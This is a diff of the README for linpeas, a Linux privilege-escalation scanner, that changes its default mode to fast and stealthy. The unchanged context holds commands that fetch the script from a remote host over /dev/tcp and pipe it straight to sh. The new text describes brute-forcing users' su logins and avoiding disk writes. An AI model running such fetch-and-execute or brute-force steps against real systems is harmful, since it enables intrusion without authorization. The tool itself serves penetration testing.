@@ -25,6 +25,9 @@ nc -q 5 -lvnp 80 < linpeas.sh
 cat < /dev/tcp/10.10.10.10/80 | sh
 ```
 
+## IMPORTANT CHANGE
+**For satisfying most users and thanks to the incorporation of the 2000pwds/user su bruteforce, the default behaviour of linpeas has been changed to fast/stealth (no writting to disk, no 1min processes check, and no su BF). Use the parameter -a to execute all these checks**
+
 ## Basic Information
 
 The goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD and OpenBSD).
@@ -33,11 +36,13 @@ This script doesn't have any dependency.
 
 It uses **/bin/sh** sintax, so can run in anything supporting `sh` (and the binaries and parameters used).
 
-It could take from **3 to 4 minutes** to execute the whole script (less than 1 min to make almost all the checks, 20s/user bruteforce with top2000, almost 1 min to search for possible passwords inside all the accesible files of the system, and 1 min to monitor the processes in order to find very frequent cron jobs). 
+By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**. 
 
-You can **decrease this** time and be more **stealthy** using the parameters: 
-- **-f** (fast & stealth) - This will bypass checking processes during 1 min and su brute - **Stealthy mode** (Nothing will be written to disk)
-- **-s** (superfast & stealth) - This will bypass the previous checks and other time consuming checks - **Stealthy mode** (Nothing will be written to disk)
+It could take from **3 to 4 minutes** to execute all the checks using **-a** parameter (less than 1 min to make almost all the checks, 20s/user bruteforce with top2000 passwords, almost 1 min to search for possible passwords inside all the accesible files of the system, and 1 min to monitor the processes in order to find very frequent cron jobs). 
+
+Other parameters: 
+- **-a** (all checks) - This will **execute also the check of processes during 1 min, and brute-force each user using `su` with the top2000 passwords.**
+- **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
 
 This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
 
